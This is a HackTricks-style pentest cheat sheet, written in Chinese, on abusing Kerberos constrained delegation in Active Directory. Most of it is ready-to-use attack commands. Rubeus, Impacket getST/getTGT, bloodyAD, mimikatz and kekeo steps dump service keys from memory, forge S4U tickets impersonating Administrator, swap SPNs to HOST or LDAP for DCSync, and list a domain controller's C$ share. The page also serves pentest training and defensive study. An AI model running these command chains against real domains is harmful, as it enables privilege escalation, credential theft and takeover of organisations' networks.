# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

使用此机制，域管理员可以**允许**一台计算机在目标机器的任何**service**上**模拟（impersonate）用户或计算机**。

- **Service for User to self (_S4U2self_):** 如果一个**服务账户**的 _userAccountControl_ 值包含 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D)，那么它可以代表任何其他用户为自己（该服务）获取 TGS。
- **Service for User to Proxy(_S4U2proxy_):** 一个**服务账户**可以代表任何用户向在 **msDS-AllowedToDelegateTo** 中设置的服务获取 TGS。为此，它首先需要从该用户到自身的 TGS，但它可以先使用 S4U2self 获取该 TGS，然后再请求另一个。

**Note**: 如果一个用户在 AD 中被标记为 ‘_Account is sensitive and cannot be delegated_’，你将**无法模拟**他们。

这意味着如果你**获取了该服务的 hash**，你就可以**模拟用户**并代表他们获得对指定机器上任何**service**的**访问**（可能导致 **privesc**）。

此外，你**不仅能够访问用户能够被模拟的那个服务，还能访问任何服务**，因为 SPN（请求的 service 名称）并未被验证（在票证中这部分没有被加密/签名）。因此，例如如果你有对 **CIFS service** 的访问，你也可以使用 Rubeus 的 `/altservice` 标志访问 **HOST service**。相同的 SPN 交换弱点也被 **Impacket getST -altservice** 和其他工具滥用。

另外，**对 DC 的 LDAP service 访问** 是利用 **DCSync** 所需的条件。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation 说明 (2025+)

自 **Windows Server 2012/2012 R2** 起，KDC 通过 S4U2Proxy 扩展支持 **constrained delegation across domains/forests**。现代版本（Windows Server 2016–2025）保持此行为，并添加两个 PAC SIDs 来表明 protocol transition：

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) 表示用户以正常方式进行了认证。
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) 表示服务通过 protocol transition 断言了该身份。

当跨域使用 protocol transition 时，预期在 PAC 中会看到 `SERVICE_ASSERTED_IDENTITY`，以确认 S4U2Proxy 步骤已成功。

### Impacket / Linux 工具 (altservice & full S4U)

近期的 Impacket (0.11.x+) 暴露了与 Rubeus 相同的 S4U 链和 SPN 交换：
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
如果你更喜欢先伪造用户 ST（例如，仅离线哈希），将 **ticketer.py** 与 **getST.py** 配合用于 S4U2Proxy。查看开放的 Impacket issue #1713 以了解当前异常（当伪造的 ST 与 SPN 密钥不匹配时会出现 KRB_AP_ERR_MODIFIED）。

### 从低权限凭据自动化配置委派

如果你已经对某台计算机或 service account 拥有 **GenericAll/WriteDACL**，可以使用 **bloodyAD (2024+)** 在不使用 RSAT 的情况下远程推送所需属性：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
只要你能写入那些属性，这可以让你在没有 DA 权限的情况下为 privesc 构建受限委派路径。

- 第 1 步: **获取被允许的服务的 TGT**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 存在 **其他方式可以获得 TGT ticket** 或者 **RC4** 或 **AES256**（无需在该计算机上成为 SYSTEM），例如 Printer Bug、unconstrain delegation、NTLM relaying 和对 Active Directory Certificate Service 的滥用
>
> **仅凭该 TGT ticket（或其哈希）即可在不攻陷整台计算机的情况下执行此攻击。**

- 步骤2：**以模拟用户的身份为服务获取 TGS**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 以及 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 参考资料
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
